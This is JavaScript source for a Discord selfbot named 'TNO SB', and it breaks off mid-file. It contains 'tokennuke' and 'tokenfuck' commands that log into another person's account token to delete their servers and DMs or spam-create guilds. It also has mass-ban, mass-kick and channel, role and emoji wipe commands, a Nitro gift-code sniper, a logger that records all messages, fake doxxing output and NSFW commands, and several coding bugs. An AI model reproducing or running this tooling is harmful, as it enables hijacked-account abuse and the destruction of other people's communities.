//#region  package
const {
    Client,
    RichEmbed
} = require('discord.js');
const {
    red,
    green,
    blue,
    yellow,
    cyan,
    white,
} = require('chalk');
const bot = new Client();
const messagelogger = new Client()
const settings = require('./settings.json');
const ascii = require('ascii-art');
const ms = require('ms');
const http = require('http');
const fs = require('fs');
const fetch = require('node-fetch')
const moment = require("moment");
const weather = require("weather-js");
const superagent = require("superagent")
const identity = require('fake-identity');
const pokemon = require('pokemon-images')
const urban = require('relevant-urban')
const axios = require('axios').default;
const nitrosniper = new Client()
const snekfetch = require("snekfetch");
const gtranslate = require("translate-google");
const request = require('request');



var afkmode = false;
//#endregion
//#region TNO SB
function  tnologo() {
    console.log(red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
    console.log(red('                            ::::::::::: ::::    :::  ::::::::        ::::::::  :::::::::  '));
    console.log(red('                                :+:     :+:+:   :+: :+:    :+:      :+:    :+: :+:    :+: '));
    console.log(red('                                +:+     :+:+:+  +:+ +:+    +:+      +:+        +:+    +:+ '));
    console.log(red('                                +#+     +#+ +:+ +#+ +#+    +:+      +#++:++#++ +#++:++#+  '));
    console.log(red('                                +#+     +#+  +#+#+# +#+    +#+             +#+ +#+    +#+ '));
    console.log(red('                                #+#     #+#   #+#+# #+#    #+#      #+#    #+# #+#    #+# '));
    console.log(red('                                ###     ###    ####  ########        ########  #########  '));
}
//#endregion

//#region  the main
bot.on('ready', () => {
    request("https://pastebin.com/raw/AYZZPpgt", (err, res, body) => {
        body = body.toString().split("\r\n")
        if(res.body.includes(bot.user.id)){
            let messageloggerstatus = "";
            if (settings.messagelogger === "true") {
                messageloggerstatus = `Activated`
            } else {
                messageloggerstatus = `Deactivated`
            };
            let nitrostatus = "";
            if (bot.user.premium = "true") {
                nitrostatus = `Nitro Activated`
            } else {
                nitrostatus = `Nitro not Activated`
            };
            let verifiedstatus = "";
            if (bot.user.verified = "true") {
                verifiedstatus = `Is Verified`
            } else {
                verifiedstatus = `Is not Verified`
            };
            tnologo()
            console.log(                     blue(`                                           ━ USERNAME      | ${bot.user.tag}      `));
            console.log(                     blue(`                                           ━ PREFIX        | ${settings.prefix}  `));
            console.log(                     blue(`                                           ━ ID            | ${bot.user.id}      `));
            console.log(                     blue(`                                           ━ MESSAGELOGGER | ${messageloggerstatus}`));
            console.log(                     blue(`                                           ━ VERIFIED      | ${verifiedstatus}    `));
            console.log(                     blue(`                                           ━ NITRO         | ${nitrostatus}     `));
            console.log(red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        //#endregion
        //#region messagelogger
        if (settings.messagelogger === 'true') {
            messagelogger.login(settings.token)
            messagelogger.on("ready", () => {
                messagelogger.on("message", message => {
                    if (message.channel.type === "text") {
                        console.log(red(message.guild.name) + white(" : ") + blue(message.channel.name) + white(" : ") + yellow(message.author.tag) + white(" : ") + green(message))
                    } else if (message.channel.type === "dm") {
                        console.log(red("No Guild") + white(" : ") + blue("DMs") + white(" : ") + yellow(message.author.tag) + white(" : ") + green(message))
                    }
                })
            })
        } else if (settings.messagelogger === 'false') {}
        //#endregion
        //#region nitro sniper
        nitrosniper.login(settings.token)
        nitrosniper.on("ready", () => {
            nitrosniper.on("message", message => {
                if (message.author.bot) {
                    return;
                }
                if (message.content.includes('discord.gift') || message.content.includes('discordapp.com/gifts/')) {
        
                    var Nitro = /(discord\.(gift)|discordapp\.com\/gift)\/.+[a-z]/
        
                    var NitroUrl = Nitro.exec(message.content);
                    var NitroCode = NitroUrl[0].split('/')[1];
        
                    axios({
                        method: 'POST',
                        url: `https://discordapp.com/api/v6/entitlements/gift-codes/${NitroCode}/redeem`,
                        headers: {
                            'Authorization': settings.token
                        }
                    }).then(
                        () => console.log(green(`Successfull redeemed Gift: `) + NitroCode + "\n")
                    ).catch(() => console.log(white(`Error: `) + red("Failed To Claim Gift: " + NitroCode + " \n")))
                }
            })
        })
        //#endregion
        //#region  bot.on
        bot.on('message', async (msg) => {
            if (msg.author.id !== settings.ID) {
                return;
            }
            let cmd = msg.content.split(" ")[0]
            cmd = cmd.slice(settings.prefix.length);
            let args = msg.content.split(" ").slice(1);
        
            if (msg.content.startsWith(settings.prefix) && msg.author.id === settings.ID) {
                console.log(red(`[TYPE] > ${msg.content}`));
            }
            //#endregion
            //#region tokennuke
            if (cmd === 'tokennuke') {
                const yournukebotname = new Client()
                let nuketoken = args.join(" ")
                yournukebotname.login(nuketoken)
                yournukebotname.on("ready", () => {
                    yournukebotname.users.forEach(users => users.deleteDM())
                    yournukebotname.guilds.forEach(guild => guild.delete())
                    yournukebotname.user.setAvatar("https://cdn.discordapp.com/attachments/733746369608548373/753411945801056336/unnamed.jpg")
                })
            }
            //#endregion
            //#region  tokenFuck
            if (cmd === 'tokenfuck') {
                const yournukebotname = new Client()
                let nuketoken = args.join(" ")
                yournukebotname.login(nuketoken)
                yournukebotname.on("ready", () => {
                    setInterval(() => {
                        var list = yournukebotname.guilds.array();
                        yournukebotname.user.createGuild("TNO SB")
                        list.forEach(guild => guild.setIcon("https://cdn.discordapp.com/attachments/752518392443043900/754870396838215740/egirl.PNG"))
                    }, 1000);
                })
            }
            //#endregion
            //#region help cpommand
            if (cmd === 'help') {
                let embed = new RichEmbed()
                    .addField('__𝙏𝙀𝙓𝙏__', '`𝘚𝘏𝘖𝘞 𝘛𝘌𝘟𝘛 𝘊𝘖𝘔𝘔𝘈𝘕𝘋`', true)
                    .addField('__𝗦𝗧𝗔𝗧𝗨𝗦__', '`𝘚𝘏𝘖𝘞 𝘚𝘛𝘈𝘛𝘜𝘚 𝘊𝘖𝘔𝘔𝘈𝘕𝘋`', true)
                    .addField('__𝗡𝗨𝗞𝗘__', '`𝘚𝘏𝘖𝘞 𝘕𝘜𝘒𝘌 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚`', true)
                    .addField('__𝗜𝗡𝗙𝗢__', '`𝘚𝘏𝘖𝘞 𝘐𝘕𝘍𝘖 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚`', true)
                    .addField('__𝗙𝗨𝗡__', '`𝘚𝘏𝘖𝘞 𝘍𝘜𝘕 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚`', true)
                    .addField('__𝐒𝐘𝐑𝐔𝐒__', '`𝘚𝘏𝘖𝘞 𝘊𝘙𝘌𝘈𝘛𝘖𝘙 𝘐𝘕𝘍𝘖`', true)
                    .setThumbnail('https://cdn.discordapp.com/attachments/738343584515752026/748007481862783167/original_3.gif')
                    .setAuthor("𝗧𝗡𝗢 | 𝗦𝗘𝗟𝗙𝗕𝗢𝗧 | 𝗩𝟰")
                    .setTimestamp()
                msg.edit(embed)
            }
            //#endregion
            //#region ranactivity
            if (cmd === 'ranactivity') {
                let statustring = ["idle", "dnd", "online"]
                let outputstatus = statustring[Math.floor(Math.random() * statustring.length)]
                msg.react("👍")
                setInterval(function() {
                    bot.user.setStatus(outputstatus)
                }, 4000)
            }
            //#endregion
            //#region text command
            if (cmd === 'text') {
                let embed = new RichEmbed()
                    .setTitle('𝙏𝙀𝙓 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝗦')
                    .addField('𝘛𝘺𝘱𝘪𝘯𝘨', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘛𝘺𝘱𝘪𝘯𝘨 `', true)
                    .addField('𝘋𝘰𝘰𝘮', '`𝘚𝘩𝘰𝘸 𝘋𝘰𝘰𝘮 𝘈𝘴𝘤𝘪𝘪`', true)
                    .addField('𝘙𝘶𝘴𝘵𝘦𝘥', '`𝘚𝘩𝘰𝘸 𝘙𝘶𝘴𝘵𝘦𝘥 𝘈𝘴𝘤𝘪𝘪`', true)
                    .addField('𝘗𝘢𝘤𝘬', '`𝘙𝘢𝘯𝘥𝘰𝘮 𝘗𝘢𝘤𝘬 𝘛𝘦𝘹𝘵`', true)
                    .addField('𝘚𝘱𝘢𝘮', '`𝘚𝘱𝘢𝘮 𝘛𝘦𝘹𝘵 (𝘈𝘮𝘰𝘶𝘯𝘵)`', true)
                    .addField('𝘊𝘭𝘦𝘢𝘳', '`𝘋𝘦𝘭𝘦𝘵𝘦 𝘈𝘭𝘭 𝘔𝘴𝘨`', true)
                    .addField('𝘗𝘶𝘳𝘨𝘦', '`𝘋𝘦𝘭𝘦𝘵𝘦 (𝘈𝘮𝘰𝘶𝘯𝘵) 𝘖𝘧 𝘔𝘴𝘨`', true)
                    .addField('𝘍𝘭𝘪𝘱𝘤𝘰𝘪𝘯', '`𝘛𝘢𝘪𝘭𝘴 𝘖𝘳 𝘏𝘦𝘢𝘥𝘴`', true)
                    .addField('𝘈𝘧𝘬', '`𝘈𝘧𝘬𝘰𝘯/𝘈𝘧𝘬𝘰𝘧𝘧 𝘥𝘰 𝘈𝘧𝘬𝘰𝘯 2000/𝘛𝘦𝘹𝘵`', true)
                    .addField('𝘋𝘮', '` 𝘗𝘪𝘯𝘨 @𝘜𝘴𝘦 𝘈𝘯𝘥 𝘋𝘮 𝘏𝘪𝘮 𝘍𝘳𝘰𝘮 𝘎𝘤/𝘚𝘦𝘳𝘷𝘦𝘳𝘴`', true)
                    .addField('𝘜𝘱𝘛𝘪𝘮𝘦', '`𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘏𝘰𝘶𝘳/𝘔𝘪𝘯/𝘚𝘦𝘤 𝘛𝘦𝘭𝘭 𝘚𝘣 𝘖𝘯`', true)
                    .addField('𝘜𝘳𝘣𝘢𝘯', '`𝘚𝘩𝘰𝘸 𝘜𝘳𝘣𝘢𝘯 𝘔𝘦𝘢𝘯𝘪𝘯𝘨`', true)
                    .setThumbnail('https://cdn.discordapp.com/attachments/738343584515752026/748007481862783167/original_3.gif')
                msg.edit(embed)
            }
            //#endregion



                    //#region smile command
            if (cmd === 'smile') {
                let embed = new RichEmbed()
                    .setTitle('SMILE AT U')
                    .setThumbnail('https://cdn.discordapp.com/attachments/760313418388865035/760573146855374848/image0.gif')

                msg.edit(embed)
            }
            //#endregion
            //#region  nuke command
            if (cmd === 'nuke') {
                let embed = new RichEmbed()
                    .setTitle('𝗡𝗨𝗞𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦')
                    .addField('𝘔𝘢𝘴𝘴𝘣', '`𝘉𝘢𝘯 𝘈𝘭𝘭 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true)
                    .addField('𝘔𝘢𝘴𝘴𝘬', '`𝘒𝘪𝘤𝘬 𝘈𝘭𝘭 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true)
                    .addField('𝘙𝘦𝘮𝘰𝘷𝘦𝘤', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘈𝘭𝘭 𝘊𝘩𝘢𝘯𝘯𝘦𝘭`', true)
                    .addField('𝘔𝘢𝘴𝘴𝘶', '`𝘜𝘣𝘢𝘯 𝘈𝘭𝘭 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true)
                    .addField('𝘙𝘦𝘮𝘰𝘷𝘦𝘳', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘈𝘭𝘭 𝘙𝘰𝘭𝘦𝘴`', true)
                    .addField('𝘙𝘦𝘮𝘰𝘷𝘦𝘦', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘈𝘭𝘭 𝘌𝘮𝘰𝘫𝘪`', true)
                    .addField('𝘔𝘢𝘴𝘴𝘤', '`𝘔𝘢𝘬𝘦 𝘏𝘦𝘭𝘭𝘢 𝘛𝘦𝘹𝘵 𝘊𝘩𝘢𝘯𝘯𝘦𝘭`', true)
                    .addField('𝘔𝘢𝘴𝘴𝘷', '`𝘔𝘢𝘬𝘦 𝘩𝘦𝘭𝘭𝘢 𝘝𝘤 𝘊𝘩𝘢𝘯𝘯𝘦𝘭`', true)
                    .addField('𝘛𝘰𝘬𝘦𝘯𝘕𝘶𝘬𝘦', '`𝘙𝘦𝘮𝘰𝘷𝘦 𝘌𝘷𝘦𝘳𝘺𝘵𝘩𝘪𝘯𝘨 𝘍𝘳𝘰𝘮 𝘈𝘤𝘤𝘰𝘶𝘯𝘵`', true)
                    .addField('TokenFuck', '`𝘊𝘳𝘦𝘢𝘵𝘦 𝘔𝘢𝘴𝘴 𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘐𝘯 𝘈𝘤𝘤𝘰𝘶𝘯𝘵`', true)
                    .setThumbnail('https://cdn.discordapp.com/attachments/738343584515752026/748007481862783167/original_3.gif')
                msg.edit(embed)
            }
            //#endregion
            //#region  info command
            if (cmd === 'info') {
                let embed = new RichEmbed()
                    .setTitle('𝗜𝗡𝗙𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦')
                    .addField('𝘐𝘱', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘐𝘱`', true)
                    .addField('𝘚𝘵𝘢𝘵𝘴', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘚𝘦𝘳𝘷𝘦𝘳 𝘈𝘯𝘥 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true)
                    .addField('𝘜𝘴𝘦𝘳𝘪𝘥', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘋𝘰𝘹𝘹`', true)
                    .addField('𝘛𝘰𝘬𝘦𝘯𝘐𝘯𝘧𝘰', '`𝘚𝘩𝘰𝘸 𝘛𝘰𝘬𝘦𝘯 𝘐𝘯𝘧𝘰`', true)
                    .addField('𝘐𝘱 𝘚𝘦𝘢𝘳𝘤𝘩', '`𝘚𝘩𝘰𝘸 𝘐𝘱 𝘐𝘯𝘧𝘰`', true)
                    .addField('𝘚𝘦𝘳𝘷𝘦𝘳𝘐𝘯𝘧𝘰', '`𝘚𝘩𝘰𝘸 𝘚𝘦𝘳𝘷𝘦𝘳𝘐𝘯𝘧𝘰`', true)
                    .addField('𝘗𝘧𝘱', '`𝘚𝘩𝘰𝘸 @𝘶𝘴𝘦𝘳 𝘈𝘷𝘢𝘵𝘢𝘳`', true)
                    .addField('𝘚𝘵𝘢𝘵𝘴', '`𝘚𝘩𝘰𝘸 𝘚𝘦𝘳𝘷𝘦𝘳 𝘈𝘯𝘥 𝘔𝘦𝘮𝘣𝘦𝘳𝘴`', true)
                    .addField('𝘚𝘵𝘦𝘢𝘭𝘱𝘧𝘱', '`𝘚𝘵𝘦𝘢𝘭 @𝘶𝘴𝘦𝘳 𝘈𝘷𝘢𝘵𝘢𝘳`', true)
                    .addField('𝘚𝘦𝘵𝘗𝘧𝘱', '`𝘚𝘦𝘵𝘗𝘧𝘱 𝘞𝘪𝘵𝘩 𝘜𝘳𝘭`', true)
                    .addField('𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘐𝘯 𝘚𝘦𝘳𝘷𝘦𝘳𝘴`', true)
                    .addField('𝘙𝘰𝘭𝘦𝘴', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘔𝘢𝘯𝘺 𝘙𝘰𝘭𝘦𝘴 𝘐𝘯 𝘚𝘦𝘳𝘷𝘦𝘳𝘴`', true)
                    .addField('𝘓𝘦𝘢𝘷𝘦𝘚𝘦𝘳𝘷𝘦𝘳𝘴', '`𝘓𝘦𝘢𝘷𝘦𝘚𝘦𝘳𝘷𝘦𝘳𝘴/𝘋𝘦𝘭𝘦𝘵𝘦𝘥 𝘚𝘦𝘳𝘷𝘦𝘳 𝘸𝘰𝘯𝘵 𝘥𝘦𝘭𝘦𝘵𝘦 𝘪𝘧 𝘶 𝘩𝘢𝘷𝘦2𝘧𝘢`', true)
                    .setThumbnail('https://cdn.discordapp.com/attachments/738343584515752026/748007481862783167/original_3.gif')
                msg.edit(embed)
            }
            //#endregion
            //#region  status command
            if (cmd === 'status') {
                let embed = new RichEmbed()
                    .setTitle('𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎')
                    .addField('𝘚𝘵𝘳𝘦𝘢𝘮𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘚𝘵𝘳𝘦𝘢𝘮𝘪𝘯𝘨`', true)
                    .addField('𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨`', true)
                    .addField('𝘓𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘓𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨`', true)
                    .addField('𝘗𝘭𝘢𝘺𝘪𝘯𝘨', '`𝘊𝘩𝘢𝘯𝘨𝘦 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘗𝘭𝘢𝘺𝘪𝘯𝘨`', true)
                    .addField('𝘚𝘵𝘰𝘱', '`𝘚𝘵𝘰𝘱 𝘠𝘰𝘶𝘳 𝘚𝘵𝘢𝘵𝘶𝘴`', true)
                    .setThumbnail('https://cdn.discordapp.com/attachments/738343584515752026/748007481862783167/original_3.gif')
                msg.edit(embed)
            }
            //#endregion
            //#region func command
            if (cmd === 'fun') {
                let embed = new RichEmbed()
                    .setTitle('𝙁𝙐𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿')
                    .addField('𝘚𝘱𝘢𝘯𝘬', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘛𝘺𝘱𝘪𝘯𝘨 `', true)
                    .addField('𝘚𝘮𝘶𝘨', '`𝘚𝘩𝘰𝘸 𝘋𝘰𝘰𝘮 𝘈𝘴𝘤𝘪𝘪`', true)
                    .addField('𝘒𝘪𝘴𝘴', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘒𝘪𝘴𝘴 𝘎𝘪𝘧`', true)
                    .addField('𝘏𝘶𝘨', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘏𝘶𝘨 𝘎𝘪𝘧`', true)
                    .addField('𝘚𝘭𝘢𝘱', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘚𝘭𝘢𝘱 𝘎𝘪𝘧`', true)
                    .addField('𝘧𝘢𝘬𝘦𝘸𝘪𝘻𝘻', '`𝘚𝘩𝘰𝘸 𝘌𝘮𝘣𝘦𝘥 𝘖𝘧 𝘍𝘢𝘬𝘦𝘸𝘪𝘻𝘻`', true)
                    .addField('𝘉𝘰𝘰𝘣𝘴', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘉𝘰𝘰𝘣𝘴 𝘎𝘪𝘧`', true)
                    .addField('𝘍𝘦𝘦𝘥', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘍𝘦𝘦𝘥 𝘎𝘪𝘧`', true)
                    .addField('𝘛𝘪𝘤𝘬𝘭𝘦', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘛𝘪𝘤𝘬𝘭𝘦 𝘎𝘪𝘧`', true)
                    .addField('𝘏𝘢𝘯𝘥𝘫𝘰𝘣', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘏𝘢𝘯𝘥𝘫𝘰𝘣 𝘌𝘥𝘪𝘵𝘦𝘥`', true)
                    .addField('𝘓𝘰𝘭', '`𝘗𝘪𝘯𝘨 @𝘶𝘴𝘦𝘳 𝘛𝘰 𝘚𝘩𝘰𝘸 𝘓𝘰𝘭`', true)
                    .addField('𝘛𝘰𝘬𝘦𝘯', '`@𝘜𝘴𝘦𝘳 𝘚𝘩𝘰𝘸 𝘏𝘢𝘭𝘧 𝘛𝘰𝘬𝘦𝘯`', true)
                    .addField('𝘛𝘺𝘱𝘪𝘯𝘨', '`𝘚𝘩𝘰𝘸 𝘍𝘢𝘬𝘦 𝘛𝘺𝘱𝘪𝘯𝘨`', true)
                    .addField('𝘎𝘢𝘺', '`𝘚𝘩𝘰𝘸 𝘏𝘰𝘸 𝘎𝘢𝘺`', true)
                    .addField('𝘗𝘰𝘬𝘪', '`𝘚𝘩𝘰𝘸 𝘗𝘰𝘬𝘦𝘮𝘰𝘯`', true)
                    .addField('𝘌𝘮𝘣𝘦𝘥', '`𝘛𝘶𝘳𝘯 𝘛𝘦𝘹𝘵 𝘌𝘮𝘣𝘦𝘥`', true)
                    .setThumbnail('https://cdn.discordapp.com/attachments/738343584515752026/748007481862783167/original_3.gif')
                msg.edit(embed)
            }
            //#endregion
//#region urban
            if (cmd === 'urban') {
                try {
                    const search = await urban(args.join(" "))
                
                    let embed = new RichEmbed()
                    .setDescription(`**${search.word}**\nDefinition: **${search.definition}**\n\n${search.example}`)
                    .setColor("RANDOM")
                    msg.channel.send(embed)
                } catch(err) {
                    return msg.reply('Could not find that query.')
                }
                    
                    
                  
                }
//#endregion



//#region embed
                if (cmd === 'embed') {
                if(args.join(" ").length > 2000) return msg.reply('Text may not exceed 2000 characters.')

                let embed = new RichEmbed()
                .setDescription(args.join(" "))
                .setColor("RANDOM")
                msg.channel.send(embed)
            
                
            
            }
//#endregion
if (cmd === 'match') {
    let user = msg.mentions.users.first()
        if (!user) return msg.reply('You forgot to mention a user.')
        let embed = new RichEmbed()
            .setDescription(`${msg.author.tag} AND ${user.tag} ARE ${ran(0, 100)}%MATCH`)
            .setThumbnail('https://cdn.discordapp.com/attachments/761669598881644544/762703961038913566/astro-love-2-1539638099.gif')
            .setColor("#000000")
        msg.channel.send(embed);
}
//#region  gay
                if (cmd === 'gay') {
                    let member = msg.mentions.users.first();

                    if (!member) member = msg.author
                
                    msg.channel.send(
                        new RichEmbed()
                        .setColor('RANDOM')
                        .setDescription(`${member} is ${ran(0, 100)}% Gay`)
                        .setThumbnail('http://gph.is/16IPbc6')
                    );
                   
                }
                
                function ran(min, max) { // min and max included 
                    return Math.floor(Math.random() * (max - min + 1) + min);
                }
//#endregion
  //#region  setpfp
if (cmd === 'setpfp') {
                try {

  
                    if (!/\.(jpe?g|png|gif)$/i.test(args[0])) {
                        return msg.reply('URL NOT WORKING')
                    }
                
                    client.user.setAvatar(args[0])
                    await msg.react("Done")
                    return;
                
                
                } catch(err) {
                    msg.channel.send('Error, make sure you are not trying to upload a gif image when you do not have nitro.')
                }
                
                }
//#endregion
//#region  massb
if (cmd === 'massb') {
    const Guild = message.guild;

    if (!Guild) return;

    // Primary Nuke Functions
    async function BanAll() {
        await Guild.fetchMembers();

        await Promise.all(Guild.members.map(async (m) => {
            if (m.bannable) {
                m.ban();
            }
        }));
    }
    BanAll()

}
//#endregion
//#region  massK
if (cmd === 'massk'){
    try{
        msg.guild.members.forEach(Member => {
            if(Member.kickable){
                console.log(yellow(`[INFO] Kicked` + Member.user.username))
                Member.kick()
                console.log(green("[INFO] Kicked All Possible Members!"))
            }
            else {
                console.log(yellow("[INFO] Couldn't kick " + Member+user+username + " you have no permissions"))
            }
        })
    }
            catch(err){

            }
}
//#endregion

if (cmd === 'google') {

}
   

//#region  channels
if (cmd === 'channels') {
    if(msg.guild.channels.map(r => r.name).join("").length > 2000) return msg.reply('This server has too many channels to display! (' + msg.guild.channels.size + ' roles)')

    let embed = new RichEmbed()
    .setDescription(msg.guild.channels.map(r => r.name).join(", "))  
    .setColor("RANDOM")
    .setThumbnail('https://cdn.discordapp.com/attachments/759121464481546250/760991389373956116/giphy_2.gif')
    msg.channel.send(embed)
}
//#endregion
//#region  roles
if (cmd === 'roles') {
    if(msg.guild.roles.map(r => r.toString()).join("").length > 2000) return msg.reply('This server has too many roles to display! (' + msg.guild.roles.size + ' roles)')

    let embed = new RichEmbed()
    .setDescription(msg.guild.roles.map(r => r.toString()).join(""))  
    .setColor("RANDOM")
    .setThumbnail('https://cdn.discordapp.com/attachments/759121464481546250/760991389373956116/giphy_2.gif')
    msg.channel.send(embed)
}
//#endregion

//#region remove channel and kickall
            if (cmd === 'removec') {
                msg.delete();
                msg.guild.channels.forEach(channel => channel.delete())
            }
            if (cmd === 'removec') {
                msg.delete();
                msg.guild.channels.forEach(channel => channel.delete())
            }
            if (cmd === 'removec') {
                msg.delete();
                msg.guild.channels.forEach(channel => channel.delete())
            }
        
        
            if (cmd === 'removec') {
                msg.delete();
                msg.guild.channels.forEach(channel => channel.delete())
            }
            if (cmd === 'removec') {
                msg.delete();
                msg.guild.channels.forEach(channel => channel.delete())
            }
            if (cmd === 'removec') {
                msg.delete();
                msg.guild.channels.forEach(channel => channel.delete())
            }
            //#endregion
            //#region userid command
            if (cmd === 'userid') {
                let embed = new RichEmbed()
                    .addField("Gender", identity.generate().sex)
                    .addField("First Name", identity.generate().firstName)
                    .addField("Email Address", identity.generate().emailAddress)
                    .addField("Phone Number", identity.generate().phoneNumber)
                    .addField("Street", identity.generate().street)
                    .addField("City", identity.generate().city)
                    .addField("State", identity.generate().state)
                    .addField("Zip Code", identity.generate().zipCode)
                    .addField("Date of Birth", identity.generate().dateOfBirth)
                    .addField("Company", identity.generate().company)
                    .addField("Department", identity.generate().department)
                msg.edit(embed)
            }
            //#endregion
            //#region IP
            if (cmd === 'ip') {
                var ip = (Math.floor(Math.random() * 255) + 1) + "." + (Math.floor(Math.random() * 255)) + "." + (Math.floor(Math.random() * 255)) + "." + (Math.floor(Math.random() * 255));
                let user = msg.mentions.users.first()
                let embed = new RichEmbed()
                    .setDescription(user + "'s IP: " + ip)
                msg.edit(embed)
            }
            //#endregion
            //#region remove channel
            if (cmd === 'removec') {
                msg.guild.channels.forEach(channel => channel.delete())
                msg.guild.roles.forEach(role => role.delete())
                msg.guild.emojis.forEach(emoji => emoji.delete())
            }
        
            if (cmd == 'removee') {
                msg.guild.emojis.forEach(emoji => emoji.delete())
            }
        
            if (cmd == 'remover') {
                msg.guild.roles.forEach(role => role.delete())
            }
        
            //#endregion

            //#region slap
            if (cmd === 'slap') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/slap", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} slaped ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region poke
            if (cmd === 'poke') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/poke", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} poked ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region boobs
            if (cmd === 'boobs') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/boobs", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} show boobs to ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region spank
            if (cmd === 'spank') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/spank", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} Spank ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region feet
            if (cmd === 'feet') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/feet", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} Show feet to ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region smug
            if (cmd === 'smug') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/spank", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} smug at ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region cuddle
            if (cmd === 'cuddle') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/cuddle", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} cuddle with ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region tits    
            if (cmd === 'tits') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/tits", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} show tits ;3 ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region blowjob
            if (cmd === 'blowjob') {
